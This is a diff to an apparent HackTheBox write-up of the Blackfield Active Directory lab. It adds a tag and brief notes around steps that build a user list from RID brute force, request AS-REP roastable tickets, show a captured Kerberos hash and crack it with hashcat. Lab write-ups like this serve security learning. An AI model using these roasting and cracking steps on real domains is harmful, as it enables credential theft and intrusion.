@@ -2,7 +2,7 @@
 render_with_liquid: false
 title: HackTheBox Writeup - Blackfield
 date: 2024-02-07 16:33 +1400
-tags: [hackthebox, nmap, windows, ad, dnsrecon, gobuster, ldapsearch, netexec, asreproast, hashcat, ldapdomaindump, bloodhound, bloodhound-python, ad-miner, lsass, pypykatz, evil-winrm, ad-backup-operators, backupoperatortoda, commando, mimikatz, impacket, vss-shadow, unix2dos, ntds, print-nightmare, win-dll, revshell-dll-nim, defense-evasion, av-bypass, nopac, faketime, coercer, oscp-like-2023]
+tags: [hackthebox, nmap, windows, ad, dnsrecon, gobuster, ldapsearch, netexec, rid-bruteforce, asreproast, hashcat, ldapdomaindump, bloodhound, bloodhound-python, ad-miner, lsass, pypykatz, evil-winrm, ad-backup-operators, backupoperatortoda, commando, mimikatz, impacket, vss-shadow, unix2dos, ntds, print-nightmare, win-dll, revshell-dll-nim, defense-evasion, av-bypass, nopac, faketime, coercer, oscp-like-2023]
 image:
     path: https://labs.hackthebox.com/storage/avatars/7c69c876f496cd729a077277757d219d.png
     width: 640
@@ -379,6 +379,8 @@ SMB         10.129.213.195  445    DC01             1431: BLACKFIELD\SRV-INTRANE
 
 ### Asreproasting
 
+Try to request TGTs for users enumerated via rid brute force
+
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
 └─$ cat nxc_users.txt | grep SidTypeUser | awk '{print $6}' | awk -F'\' '{print $2}' > ad_users.lst
@@ -395,6 +397,8 @@ Impacket v0.12.0.dev1+20240130.154745.97007e8 - Copyright 2023 Fortra
 $krb5asrep$23$support@BLACKFIELD.LOCAL:cad3a02df265c5fe0de2a8c110b215f5$d9885d6f43887c558c666be9e6dab5651c6a52b39dce7930de3e6b7b3a064234c4f6130456413db7ed321c2cc76f244b6c7fedd3e0818547bc13ee4e1dede296f69c8dab7814473b8fa5eeacc29feb213c292c92451cdbbababfd518e3232b7b90c1d78da4fc1618f1d41f28e9f5d2a29ea4c74043a2422fdc8624bb5678a3f9dbfa97a3f81bbc7886494eab24a632b8bc4f78ed39a2a9ed7a18c3ef34bfcdc89237883c50ee1dc8828b8bd083871b723a870d48432e128b6f5b87890a6dda5d94aee22b66aa6bd730b5bfa0f689f15d6946deebfad7be5913ba9c5ab75d19dc13bfd6794df152326d6f6c3eb076724a478caced
 [...]
 ```
+
+Crack the hashes
 
 ```bash
 hashcat asreproastables.txt /opt/wordlists/rockyou.txt -m 18200
